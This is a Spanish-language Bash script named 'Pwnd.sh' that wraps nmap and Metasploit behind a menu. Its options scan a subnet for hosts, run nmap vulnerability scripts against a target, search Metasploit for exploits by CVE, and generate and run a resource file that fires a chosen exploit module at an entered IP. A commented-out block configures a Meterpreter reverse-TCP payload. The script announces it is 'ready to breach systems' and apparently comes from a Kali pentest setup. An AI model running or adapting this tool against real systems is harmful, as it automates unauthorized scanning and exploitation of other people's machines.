#!/bin/bash
clear
# Colores
BOLD='\033[1m'
UNDERLINE='\033[4m'
RESET='\033[0m'
CYAN='\033[96m'
GREEN='\033[92m'
YELLOW='\033[93m'
RED='\033[91m'

# ASCII Art
echo -e "${CYAN}${BOLD}
⠄⠄⠄⠄⠄⠄⠄⢀⣠⣶⣾⣿⣶⣦⣤⣀⠄⢀⣀⣤⣤⣤⣤⣄⠄⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⢀⣴⣿⣿⣿⡿⠿⠿⠿⠿⢿⣷⡹⣿⣿⣿⣿⣿⣿⣷⠄⠄⠄⠄⠄
⠄⠄⠄⠄⠄⣾⣿⣿⣿⣯⣵⣾⣿⣿⡶⠦⠭⢁⠩⢭⣭⣵⣶⣶⡬⣄⣀⡀⠄⠄
⠄⠄⠄⡀⠘⠻⣿⣿⣿⣿⡿⠟⠩⠶⠚⠻⠟⠳⢶⣮⢫⣥⠶⠒⠒⠒⠒⠆⠐⠒
⠄⢠⣾⢇⣿⣿⣶⣦⢠⠰⡕⢤⠆⠄⠰⢠⢠⠄⠰⢠⠠⠄⡀⠄⢊⢯⠄⡅⠂⠄
⢠⣿⣿⣿⣿⣿⣿⣿⣏⠘⢼⠬⠆⠄⢘⠨⢐⠄⢘⠈⣼⡄⠄⠄⡢⡲⠄⠂⠠⠄
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣥⣀⡁⠄⠘⠘⠘⢀⣠⣾⣿⢿⣦⣁⠙⠃⠄⠃⠐⣀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣋⣵⣾⣿⣿⣿⣿⣦⣀⣶⣾⣿⣿⡉⠉⠉
⣿⣿⣿⣿⣿⣿⣿⠟⣫⣥⣬⣭⣛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠄
⣿⣿⣿⣿⣿⣿⣿⠸⣿⣏⣙⠿⣿⣿⣶⣦⣍⣙⠿⠿⠿⠿⠿⠿⠿⠿⣛⣩⣶⠄
⣛⣛⣛⠿⠿⣿⣿⣿⣮⣙⠿⢿⣶⣶⣭⣭⣛⣛⣛⣛⠛⠛⠻⣛⣛⣛⣛⣋⠁⢀
⣿⣿⣿⣿⣿⣶⣬⢙⡻⠿⠿⣷⣤⣝⣛⣛⣛⣛⣛⣛⣛⣛⠛⠛⣛⣛⠛⣡⣴⣿
⣛⣛⠛⠛⠛⣛⡑⡿⢻⢻⠲⢆⢹⣿⣿⣿⣿⣿⣿⠿⠿⠟⡴⢻⢋⠻⣟⠈⠿⠿
⣿⡿⡿⣿⢷⢤⠄⡔⡘⣃⢃⢰⡦⡤⡤⢤⢤⢤⠒⠞⠳⢸⠃⡆⢸⠄⠟⠸⠛⢿
⡟⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⢸
${RESET}"

# Comprobar dependencias
echo -e "${YELLOW}Comprobando dependencias...${RESET}"
sleep 2
echo -e "${GREEN}NMAP OK!${RESET}"
command -v nmap >/dev/null 2>&1 || { echo -e >&2 "${RED}Se requiere nmap pero no está instalado. Por favor, instálalo.${RESET}"; exit 1; }
sleep 2
echo -e "${GREEN}Metasploit OK!${RESET}"
command -v msfconsole >/dev/null 2>&1 || { echo -e >&2 "${RED}Se requiere msfconsole pero no está instalado. Por favor, instálalo.${RESET}"; exit 1; }
echo -e "${CYAN}Pwnd.sh preparado para vulnerar sistemas!${RESET}"
sleep 3

# Función para encontrar hosts en una subred
host_finder() {
    clear
    echo -e "${BOLD}${UNDERLINE}============================= Buscar Equipos en una Subred =============================${RESET}"
    echo -e "${CYAN}Introduzca la subred que va a escanear:${RESET}"
    read subnet
    echo -e "${CYAN}Buscando equipos en la subred: ${BOLD}$subnet${RESET}..."
    nmap $subnet > /tmp/host_results
    echo -e
    echo -e "${CYAN}Se han encontrado los siguientes equipos:${RESET}"
    cat /tmp/host_results
    rm /tmp/host_results
    echo -e "${BOLD}${UNDERLINE}=========================================================================================${RESET}"
}

# Función para escanear vulnerabilidades en un host
exploit_scanner() {
    clear
    echo -e "${BOLD}${UNDERLINE}==================== Escanear Vulnerabilidades en un Host ====================${RESET}"
    echo -e "${CYAN}Introduzca la IP del equipo que va a escanear:${RESET}"
    read ip
    echo -e "${CYAN}Buscando vulnerabilidades abiertas en la IP: ${BOLD}$ip${RESET}..."
    nmap -sV -Pn --script=vuln $ip > /tmp/vuln_results
    echo -e
    echo -e "${CYAN}Se han encontrado las siguientes vulnerabilidades:${RESET}"
    cat /tmp/vuln_results
    rm /tmp/vuln_results
    echo -e "${BOLD}${UNDERLINE}==============================================================================${RESET}"
}

# Función para buscar exploits por CVE
exploit_finder() {
    clear
    echo -e "${BOLD}${UNDERLINE}========= Buscar Exploit por Vulnerabilidad (CVE) =========${RESET}"
    while true; do
        echo -e "${CYAN}Indique el CVE que quiere buscar:${RESET}"
        read CVE

        # Verificar si la entrada contiene la palabra CVE
        if [ -n "$(echo -e "$CVE" | grep "CVE")" ]; then
            echo -e "${CYAN}Buscando un exploit para la vulnerabilidad ${BOLD}$CVE${RESET}..."
            sleep 3
            clear
            echo -e "${CYAN}Resultados encontrados para la vulnerabilidad ${BOLD}$CVE${RESET}!"
            msfconsole -q -x "search $CVE; exit" | grep exploit
            break
        else
            echo -e "${RED}Solo se admiten vulnerabilidades en formato CVE. Inténtalo de nuevo.${RESET}"
        fi
    done
    echo -e "${BOLD}${UNDERLINE}===========================================================${RESET}"
}

exploit_runner() {
    while true; do
        clear
        echo -e "${BOLD}${UNDERLINE}============================ Explotar Host Vulnerable ============================${RESET}"
        echo -e "${CYAN}Escriba la vulnerabilidad que desea explotar usando Metasploit:${RESET}"
        read -r vuln
        echo -e "${CYAN}Escriba la dirección IP que va a atacar:${RESET}"
        read -r ip2
        clear
        echo -e "${CYAN}¡Atacando con la vulnerabilidad ${BOLD}$vuln${CYAN} al host ${BOLD}$ip2${CYAN}!${RESET}"
        
        metasploit_script="/home/kali/script.rc"
        comando1="use $vuln"
        comando2="set RHOSTS $ip2"
        comando3="run"

        echo -e "$comando1\n$comando2\n$comando3" > "$metasploit_script"

        msfconsole -q -r "$metasploit_script"    
        
        # Guardar comandos para Metasploit
        #comandos_metasploit=("use $vuln" "set PAYLOAD windows/meterpreter/reverse_tcp" "set LHOST 127.0.0.1" "set LPORT 4444" "set RHOST $ip2")
        # Ejecutar comandos de Metasploit
        #for comando in "${comandos_metasploit[@]}"; do
        #    echo "Ejecutando: $comando"
        #    msfconsole -q -x "$comando"
        #done
    done

    echo -e "${BOLD}${UNDERLINE}=================================================================================${RESET}"
}

# Menú principal
clear
while true; do
    echo -e "${BOLD}${UNDERLINE}============================= Menú Principal =============================${RESET}"
    echo -e "${CYAN}Seleccione una opción:${RESET}"
    echo -e "${YELLOW}1. Buscar Equipos en una Subred${RESET}"
    echo -e "${YELLOW}2. Escanear Vulnerabilidades en un Host${RESET}"
    echo -e "${YELLOW}3. Buscar Exploit por Vulnerabilidad (CVE)${RESET}"
    echo -e "${YELLOW}4. Explotar Host Vulnerable${RESET}"
    echo -e "${YELLOW}5. Salir${RESET}"

    read opcion

    case $opcion in
        1) host_finder ;;
        2) exploit_scanner ;;
        3) exploit_finder ;;
        4) exploit_runner ;;
        5) exit ;;
        *) echo -e "${RED}Opción no válida. Inténtelo de nuevo.${RESET}" ;;
    esac
done